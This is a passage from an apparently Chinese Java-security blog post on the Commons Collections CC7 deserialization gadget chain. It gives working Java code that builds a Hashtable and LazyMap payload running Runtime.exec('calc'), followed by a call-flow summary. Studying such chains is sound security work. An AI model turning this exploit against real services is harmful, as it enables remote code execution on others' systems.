+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchFieldException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span>
+<span class="line"><span style="color: #ABB2BF">        };</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">hashMap1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">hashMap2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">decorateMap1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(hashMap1, chainedTransformer);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">decorateMap1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">decorateMap2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(hashMap2, chainedTransformer);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">decorateMap2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;zZ&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Hashtable</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">hashtable</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Hashtable</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(decorateMap1, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">hashtable</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(decorateMap2, </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">field</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;iTransformers&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">field</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">field</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(chainedTransformer, transformers);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">decorateMap2</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">remove</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;yy&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(hashtable);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure>
+
+<h2 id="流程总结-1"><a href="#流程总结-1" class="headerlink" title="流程总结"></a>流程总结</h2><figure class="shiki scss"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">readObject()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">rehash()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">lazyMap1.hashCode()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">LazyMap.get()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">ChainedTransformer.transform()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">InvokerTransformer → Runtime.exec()</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204212701738.png" srcset="/img/loading.gif" lazyload alt="image-20251204212701510"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CC5&amp;CC7</div>
+      <div>http://example.com/2025/12/04/CC5&amp;CC7/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Piggy Sprint</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/12/04/CC%E9%93%BE%E6%80%BB%E7%BB%93/" title="CC链总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CC链总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/04/CC4&amp;CC2/" title="CC4&amp;CC2">
+                        <span class="hidden-mobile">CC4&amp;CC2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/custom/LoadingBar/pace.min.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/RandomBanner.js"></script>
+<script src="/js/Background.js"></script>
+<script src="/js/Sidebar.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
+</html>
